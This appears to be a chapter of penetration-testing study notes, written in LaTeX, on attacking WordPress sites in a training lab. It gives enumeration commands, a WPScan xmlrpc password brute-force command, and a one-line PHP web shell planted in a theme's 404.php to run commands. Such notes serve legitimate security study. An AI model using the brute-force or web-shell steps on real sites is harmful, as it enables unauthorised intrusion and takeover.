\chapter{Wordpress}
WordPress, launched in 2003, is an open-source Content Management System (CMS)
that can be used for multiple purposes. Itâ€™s often used to host blogs and
forums.

Its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. 

WordPress is written in PHP and usually runs on Apache with MySQL as the backend.

\section{Discovery/Footprinting}

robots.txt:
\begin{verbatim}
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
\end{verbatim}

WordPress stores its plugins in the \verb+wp-content/mplugins+ directory. This
folder is helpful to enumerate vulnerable plugins. Themes are stored in the
\verb+wp-content/themes+ directory. These files should be carefully enumerated
as they may lead to RCE.

\section{Enumeration}

\subsection{Manual}
\begin{verbatim}
curl -s http://TARGET | grep WordPress
curl -s http://TARGET | grep themes
curl -s http://TARGET | grep plugins
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
\end{verbatim}

user enum because invalid user name are explicitely notified.



\subsection{WPScan}
\href{https://github.com/wpscanteam/wpscan}{WPScan }is an automated WordPress
scanner and enumeration tool. It determines if the various themes and plugins
used by a blog are outdated or vulnerable.

WPScan is also able to pull in vulnerability information from external sources.
We can obtain an API token from \href{https://wpvulndb.com/}{WPVulnDB}, which
is used by WPScan to scan for PoC and reports.To use the WPVulnDB database,
just create an account and copy the API token from the users page. This token
can then be supplied to wpscan using the \verb+--api-token+ parameter.

\begin{verbatim}
sudo wpscan --url http://IP --enumerate --api-token dEOFB<SNIP>
\end{verbatim}

\section{Login Bruteforce}

WPScan can be used to brute force usernames and passwords. it uses:
\begin{itemize}
    \item \href{https://kinsta.com/blog/xmlrpc-php/}{xmlrpc} (WordPress API to make login attempts through /xmlrpc.php)
        {\bf faster}
        \item wp-login
\end{itemize} 

username should be found by \verb+wpscan --enumerate+

\begin{verbatim}
sudo  wpscan --password-attack xmlrpc -t 20 -U john -P FILE --url URL
\end{verbatim}

\section{Code Execution}

\subsection{Modifying 404.php}
with admin access

\begin{verbatim}
system($_GET[0]);
\end{verbatim}

We know that WordPress themes are located at 
\verb+vp-content/themes/<theme name>+

then \verb+curl http:/URL/wp-content/themes/THEME/404.php?0=id+

\verb+wp_admin_shell_upload+ of metasploit~\ref{tool:metasploit} can be used to
automate that process.



\section{Known vulerabilities}
Most vulns are due to plugins

